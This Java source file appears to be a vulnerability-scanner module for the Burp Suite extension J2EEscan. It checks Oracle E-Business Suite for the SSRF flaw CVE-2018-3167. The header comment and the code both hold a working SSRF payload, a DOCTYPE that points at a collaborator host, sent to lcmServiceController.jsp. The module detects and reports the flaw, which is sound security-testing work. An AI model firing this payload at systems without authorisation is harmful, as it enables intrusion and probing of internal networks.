package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import static burp.HTTPMatcher.getApplicationContext;
import static burp.HTTPMatcher.getApplicationContextAndNestedPath;
import static burp.HTTPMatcher.getMatches;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.annotation.RunOnlyOnce;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;

/**
 *
 * Oracle E-Business Suite - Server Side Request Forgery
 * OracleEBSSSRFLCMServiceController
 *
 *
 *
 * Refs: CVE-2018-3167 -
 * https://medium.com/@x41x41x41/unauthenticated-ssrf-in-oracle-ebs-765bd789a145
 *
 * POST /OA_HTML/lcmServiceController.jsp HTTP/1.1 Host: victim.com
 * Content-Length: 56
 *
 * <!DOCTYPE root PUBLIC "-//B/A/EN" "http://burpcollaboratorpayload:80">
 *
 *
 * TODO XXE -
 * https://packetstormsecurity.com/files/134117/Oracle-E-Business-Suite-12.1.3-XXE-Injection.html
 *
 */
public class OracleEBSSSRFLCMServiceController implements IModule {

    private static final String TITLE = "Oracle E-Business Suite - SSRF LCMServiceController";
    private static final String DESCRIPTION = "J2EEscan detect a Server Side Request Forgery on the Oracle E-Business Suite<br />"
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://medium.com/@x41x41x41/unauthenticated-ssrf-in-oracle-ebs-765bd789a145<br />";

    private static final String REMEDY = "It's reccomended to apply the security patch provided by Oracle:<br />"
            + "https://nvd.nist.gov/vuln/detail/CVE-2018-3167<br />";

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();

    private PrintWriter stderr;
    
    @RunOnlyOnce
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        List<IScanIssue> issues = new ArrayList<>();

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        String protocol = url.getProtocol();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        // Collaborator context
        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
        
        String oracleSSRFDoctypePayload = String.format("<!DOCTYPE root PUBLIC \"-//B/A/EN\" \"http://%s:80\">", currentCollaboratorPayload);

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

           
            try {
                
                URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), "/OA_HTML/lcmServiceController.jsp");

                List<String> headers = new ArrayList<>();
                headers.add("POST /OA_HTML/lcmServiceController.jsp HTTP/1.1");
                headers.add("Host: " + url.getHost() + ":" + url.getPort());
                headers.add("Content-Type: application/x-www-form-urlencoded");
                headers.add("Cookie: JSESSIONID=4416F53DDE1DBC8081CDBDCDD1666FB1");

                byte[] ssrfMessage = helpers.buildHttpMessage(headers, oracleSSRFDoctypePayload.getBytes());

                IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), ssrfMessage);
                byte[] httpResponse = resp.getResponse();
                
                // Poll Burp Collaborator for remote interaction
                List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

                if (!collaboratorInteractions.isEmpty()) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            urlToTest,
                            new CustomHttpRequestResponse(ssrfMessage, httpResponse, baseRequestResponse.getHttpService()),
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));
                }

            } catch (MalformedURLException ex) {
                stderr.println("Malformed URL Exception " + ex);
                return issues;
            }

        }

        return issues;

    }
}
